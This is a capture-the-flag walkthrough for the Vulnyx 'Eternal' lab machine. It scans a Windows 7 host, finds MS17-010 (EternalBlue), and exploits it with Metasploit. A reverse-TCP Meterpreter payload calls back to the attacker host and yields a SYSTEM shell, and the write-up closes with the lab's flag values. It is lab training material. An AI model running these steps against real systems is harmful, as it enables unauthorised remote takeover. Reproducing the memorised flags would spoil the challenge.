---
icon: windows
---

**Platform:** Vulnyx\
**Operating System:** Windows

> **Tags:** `Windows` `SMB` `NSE Scripts` `MS17-010` `EternalBlue` `Metasploit` `Kernel Exploit`

## INSTALLATION

We download the `zip` containing the `.ova` of the Eternal machine, extract it, and import it into VirtualBox.

We configure the network interface of the Eternal machine and run it alongside the attacker machine.

## HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Eternal, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:d6:2a:7d      1      60  PCS Systemtechnik GmbH      
 10.0.4.32       08:00:27:14:62:18      1      60  PCS Systemtechnik GmbH
```

We identify with high confidence that the victim’s IP is `10.0.4.32`.

## PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.32
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 22:57 CET
Nmap scan report for 10.0.4.32
Host is up (0.000091s latency).
Not shown: 57837 closed tcp ports (reset), 7688 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:14:62:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.60 seconds
```

We identify port `445` (SMB) as open, among others, and determine that we are facing a `Windows 7` machine.

We leverage Nmap's `NSE scripts` to scan for specific vulnerabilities within the `SMB` service.

```bash
sudo nmap -p445 --script="smb-vuln-*" 10.0.4.32
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 23:03 CET
Nmap scan report for 10.0.4.32
Host is up (0.00021s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:14:62:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 5.25 seconds
```

We discover that the target is susceptible to `MS17-010`, commonly known as `EternalBlue`.

We are aware that several `Metasploit` modules exist to target this vulnerability.

## METASPLOIT

```bash
msfconsole
```

```bash
msf > search ms17-010
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.4.32
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

Info:

```
[*] Started reverse TCP handler on 10.0.4.12:4444 
[*] 10.0.4.32:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.4.32:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.0.4.32:445         - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.4.32:445 - The target is vulnerable.
[*] 10.0.4.32:445 - Connecting to target for exploitation.
[+] 10.0.4.32:445 - Connection established for exploitation.
[+] 10.0.4.32:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.4.32:445 - CORE raw buffer dump (40 bytes)
[*] 10.0.4.32:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
[*] 10.0.4.32:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
[*] 10.0.4.32:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 10.0.4.32:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.4.32:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.4.32:445 - Sending all but last fragment of exploit packet
[*] 10.0.4.32:445 - Starting non-paged pool grooming
[+] 10.0.4.32:445 - Sending SMBv2 buffers
[+] 10.0.4.32:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.4.32:445 - Sending final SMBv2 buffers.
[*] 10.0.4.32:445 - Sending last fragment of exploit packet!
[*] 10.0.4.32:445 - Receiving response from exploit packet
[+] 10.0.4.32:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.4.32:445 - Sending egg to corrupted connection.
[*] 10.0.4.32:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 10.0.4.32
[+] 10.0.4.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.4.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.4.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.0.4.12:4444 -> 10.0.4.32:49158) at 2025-12-07 23:06:56 +0100

meterpreter >
```

We successfully execute the exploit and establish a `Meterpreter` session.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

We already have `SYSTEM` privileges!

Finally, we locate both the `user flag` and the `root flag` in the `C:\Users\MIKE\Desktop` directory.

```
meterpreter > cat user.txt 
c4fa8bfbc9855acfced6a56a7da3156e 
meterpreter > cat root.txt 
1682c7160e3855a6685316efb97ce451 
meterpreter >
```
